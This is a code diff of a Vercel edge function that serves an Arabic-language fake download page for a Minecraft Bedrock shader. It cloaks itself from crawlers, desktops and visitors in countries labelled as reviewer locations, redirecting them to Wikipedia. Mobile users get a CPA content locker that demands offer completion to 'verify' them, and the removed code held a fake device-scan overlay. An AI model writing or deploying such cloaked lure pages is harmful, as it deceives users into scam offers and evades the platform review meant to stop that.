@@ -6,7 +6,6 @@ export default async function handler(request) {
   const country = request.headers.get('x-vercel-ip-country') || '';
   const ua = request.headers.get('user-agent') || '';
 
-  // 1. فحص نظام التشغيل لمنع أجهزة الـ Desktop وتمرير الهواتف فقط
   const isMobile = /android|iphone|ipad|ipod/i.test(ua);
   const isRealBot = /googlebot|bingbot|yandex|baiduspider|headless|selenium|puppeteer|lighthouse|crawler|spider/i.test(ua);
 
@@ -14,13 +13,11 @@ export default async function handler(request) {
     return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
   }
 
-  // 2. القائمة السوداء الجغرافية لمقرات المراجعين
   const blacklistedCountries = ['US', 'IE', 'GB', 'DE', 'FR'];
   if (country && blacklistedCountries.includes(country.toUpperCase())) {
     return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
   }
 
-  // 3. كود الصفحة مع تفعيل الهيكلة الجديدة
   const htmlContent = `
   <!DOCTYPE html>
   <html lang="ar" dir="rtl">
@@ -28,113 +25,28 @@ export default async function handler(request) {
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
       <title>بوابة التنزيل - RTX Bedrock</title>
-      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
       
-      <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1902770&tracking_id=Shder10"></script>
-
       <style>
-          :root {
-              --bg-dark: #121214;          
-              --card-bg: #1e1e24;          
-              --badge-bg: #2c2c35;         
-              --text-primary: #ffffff;     
-              --text-secondary: #a0a0ab;   
-              --accent-color: #34c759;     
-              --border-color: #2a2a32;     
-          }
-
-          body, html { margin: 0!important; padding: 0!important; width: 100%!important; min-height: 100vh!important; background-color: #ffffff!important; font-family: 'Cairo', sans-serif!important; overflow-x: hidden!important; overflow-y: auto!important; }
+          :root { --bg-dark: #121214; --text-primary: #ffffff; }
+          body, html { margin: 0; padding: 0; width: 100%; min-height: 100vh; background-color: #ffffff; font-family: 'Cairo', sans-serif; overflow-x: hidden; }
+          .top-header { width: 100%; padding: 15px 20px; background: #FFFFFF; border-bottom: 2px solid #e0e0e0; text-align: left; direction: ltr; }
+          .brand-name { font-size: 23px; font-weight: 900; color: #000; text-transform: uppercase; display: block; }
+          .mod-name { font-size: 15px; font-weight: 900; color: #000; display: block; margin-top: -4px; }
+          .content-container { max-width: 500px; margin: 0 auto; padding: 0 0 40px 0; }
+          .hook-text { font-size: 18px; font-weight: 900; text-align: center; color: #000; margin: 20px 0 12px 0; padding: 0 20px; }
+          .image-box { width: calc(100% - 40px); margin: 0 auto 15px auto; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.15); }
+          .image-box img { width: 100%; height: auto; display: block; }
+          .cpa-instructions { background: #f8f9fa; border: 2px solid #e9ecef; padding: 12px; border-radius: 8px; margin: 15px; font-size: 15px; font-weight: 900; text-align: center; color: #000; }
           
-          #verification-overlay { position: fixed!important; top: 0!important; left: 0!important; width: 100%!important; height: 100%!important; background-color: #1a1a1a!important; z-index: 999999!important; display: flex!important; justify-content: center!important; align-items: center!important; text-align: center!important; padding: 20px!important; box-sizing: border-box!important; transition: opacity 0.4s ease; }
-          .verification-box { background-color: #2a2a2a!important; padding: 30px 20px!important; border-radius: 12px!important; border: 1px solid #444!important; max-width: 480px!important; width: 90%!important; box-shadow: 0 10px 30px rgba(0,0,0,0.5)!important; margin: auto; }
-          .verification-text { color: #e0e0e0!important; font-size: 18px!important; line-height: 1.6!important; font-weight: 700!important; display: block; }
-          .success-text { color: #00ff00!important; display: block!important; margin-top: 10px!important; font-size: 20px!important; font-weight: 900!important; }
-          
-          .top-header { width: 100%!important; padding: 15px 20px!important; background: #FFFFFF!important; box-sizing: border-box!important; text-align: left!important; direction: ltr!important; border-bottom: 2px solid #e0e0e0!important; }
-          .brand-name { font-size: 23px!important; font-weight: 900!important; color: #000000!important; opacity: 1!important; text-transform: uppercase!important; display: block!important; letter-spacing: -0.5px!important; }
-          .mod-name { font-size: 15px!important; font-weight: 900!important; color: #000000!important; opacity: 1!important; display: block!important; margin-top: -4px!important; }
-          
-          .content-container { max-width: 500px!important; margin: 0 auto!important; padding: 0!important; box-sizing: border-box!important; }
-          .hook-text { font-size: 18px!important; font-weight: 900!important; text-align: center!important; color: #000000!important; opacity: 1!important; margin-bottom: 12px!important; margin-top: 20px!important; line-height: 1.5!important; padding: 0 20px!important; }
-          .cpa-instructions { font-size: 15px!important; font-weight: 900!important; color: #000000!important; opacity: 1!important; text-align: center!important; background: #f8f9fa!important; border: 2px solid #e9ecef!important; padding: 12px!important; border-radius: 8px!important; line-height: 1.6!important; margin: 15px!important; }
-
-          .image-box { width: calc(100% - 40px)!important; margin: 0 auto!important; border-radius: 10px!important; overflow: hidden!important; box-shadow: 0 4px 15px rgba(0,0,0,0.15)!important; }
-          .image-box img { width: 100%!important; height: auto!important; display: block!important; }
-          
-          .scroll-down { text-align: center!important; margin: 15px 0 15px 0!important; }
-          .scroll-text { font-size: 18px!important; font-weight: 900!important; color: #000000!important; display: block!important; }
-          .down-arrow { font-size: 24px!important; color: #000000!important; animation: bounce 1.5s infinite!important; display: block!important; margin-top: 2px!important; font-weight: 900!important; }
-          @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-5px); } 60% { transform: translateY(-3px); } }
-          
-          .offers-container {
-              background-color: var(--bg-dark) !important;
-              padding: 20px 20px 40px 20px !important;
-              margin-top: 5px !important;
-              border-top-left-radius: 20px !important;
-              border-top-right-radius: 20px !important;
-              direction: rtl;
-          }
-
-          table, tbody { display: block !important; width: 100% !important; background: transparent !important; border: none !important; }
-
-          tr {
-              display: block !important;
-              background-color: var(--card-bg) !important;
-              border: 1px solid var(--border-color) !important;
-              border-radius: 12px !important; 
-              overflow: hidden !important;    
-              margin-bottom: 12px !important;
-              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2) !important;
-              width: 100% !important;
-              box-sizing: border-box !important;
-              transition: transform 0.2s ease !important;
-              padding: 0 !important;
-              position: relative !important;
-          }
-
-          tr:active { transform: scale(0.98) !important; }
-          td { display: inline-block !important; vertical-align: middle !important; border: none !important; margin: 0 !important; padding: 0 !important; box-sizing: border-box !important; }
-          
-          td:nth-child(1) { width: 50px !important; height: 50px !important; margin: 10px !important; pointer-events: none !important; }
-          td:nth-child(1) img { width: 100% !important; height: 100% !important; border-radius: 8px !important; object-fit: cover !important; }
-
-          td:nth-child(2) { width: calc(100% - 160px) !important; text-align: right !important; padding: 10px 0 !important; }
-          
-          td:nth-child(2) a { 
-              color: var(--text-primary) !important; 
-              font-size: 14px !important; 
-              font-weight: 700 !important; 
-              line-height: 1.4 !important; 
-              text-decoration: none !important;
-              display: block !important;
-              width: 100% !important;
-              position: absolute !important;
-              top: 0 !important;
-              left: 0 !important;
-              right: 0 !important;
-              bottom: 0 !important;
-              z-index: 5 !important;
-              padding: 12px 70px 12px 90px !important; 
-              box-sizing: border-box !important;
-          }
-          
-          td:nth-child(2) span { color: var(--text-primary) !important; font-size: 14px !important; font-weight: 700 !important; line-height: 1.3 !important; display: inline-block !important; }
-
-          td:nth-child(3) { float: left !important; background-color: var(--badge-bg) !important; height: 70px !important; width: 80px !important; display: flex !important; align-items: center !important; justify-content: center !important; border-right: 1px solid var(--border-color) !important; pointer-events: none !important; }
-          td:nth-child(3) div, td:nth-child(3) span, td:nth-child(3) a, div[style*="background-color"] { background: transparent !important; color: var(--accent-color) !important; font-size: 13px !important; font-weight: 900 !important; text-align: center !important; border: none !important; padding: 0 !important; }
-          br, hr { display: none !important; }
+          /* الحاوية السوداء التي ستستقبل عروض CPAGrip */
+          #offers-wrapper { background-color: var(--bg-dark); padding: 20px; margin-top: 20px; border-top-left-radius: 20px; border-top-right-radius: 20px; min-height: 300px; }
       </style>
   </head>
   <body>
-      <div id="verification-overlay">
-          <div class="verification-box">
-              <span class="verification-text" id="status-text">جاري فحص وتأمين بيئة تشغيل النظام الحاضر...</span>
-          </div>
-      </div>
-
       <div class="top-header">
           <span class="brand-name">RTX bedrock</span>
-          <span class="brand-sub mod-name">dragon bedrock</span>
+          <span class="mod-name">dragon bedrock</span>
       </div>
 
       <div class="content-container">
@@ -144,48 +56,14 @@ export default async function handler(request) {
           <div class="hook-text">ظلال واقعية وانعكاسات ماء حقيقية وبدون أي لاق! 📱</div>
           <div class="image-box"><img src="https://i.postimg.cc/yN9XSBRK/images.jpg" alt="Minecraft Beautiful Shader"></div>
 
-          <div class="scroll-down">
-              <span class="scroll-text">للتحميل</span>
-              <span class="down-arrow">↓</span>
-          </div>
-
           <div class="cpa-instructions">
-              لتأمين عملية تنزيل حزمة الشادر المتوافقة وتأكيد هويتك كلاعب بشري حقيقي، يرجى إتمام أحد الاختبارات السريعة أدناه لتفعيل رابط التحميل المباشر بصيغة mcpack تلقائياً فوراً.
+              لتأمين عملية التنزيل، يرجى إتمام أحد الاختبارات السريعة أدناه لتفعيل رابط التحميل المباشر.
           </div>
 
-          <!-- تم التخلص تماما من وسم {{offers}} المشوه هنا -->
-          <div class="offers" id="offers"></div>
+          <div id="offers-wrapper">
+              <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1902770&tracking_id=Shder10"></script>
+          </div>
       </div>
-
-      <script>
-          document.addEventListener("DOMContentLoaded", function() {
-              var ua = navigator.userAgent;
-              var detectedDevice = "جوال ذكي";
-              
-              if (/android/i.test(ua)) {
-                  var match = ua.match(/Android.*?; (.*?) Build/i);
-                  detectedDevice = (match && match[1]) ? match[1].replace(/_/g, ' ') : "جهاز Android";
-              } else if (/iphone/i.test(ua)) { 
-                  detectedDevice = "هاتف iPhone"; 
-              }
-
-              var statusText = document.getElementById('status-text');
-              var overlay = document.getElementById('verification-overlay');
-
-              setTimeout(function() {
-                  statusText.innerHTML = "تم التعرف على جهازك:<br><span style='color:#00ff00;'>" + detectedDevice + "</span><br><br>جاري فحص وتحديث ملفات البصمة الرسومية لنسخة BetterRenderDragon...";
-              }, 800);
-
-              setTimeout(function() {
-                  statusText.innerHTML = "تم التعرف على جهازك:<br><span style='color:#00ff00;'>" + detectedDevice + "</span><br><br>جاري فحص وتحديث ملفات البصمة الرسومية لنسخة BetterRenderDragon... <span class='success-text'>[تم بنجاح]</span>";
-              }, 2300);
-
-              setTimeout(function() {
-                  overlay.style.opacity = '0';
-                  setTimeout(function() { overlay.style.display = 'none'; }, 400);
-              }, 3500);
-          });
-      </script>
   </body>
   </html>
   `;
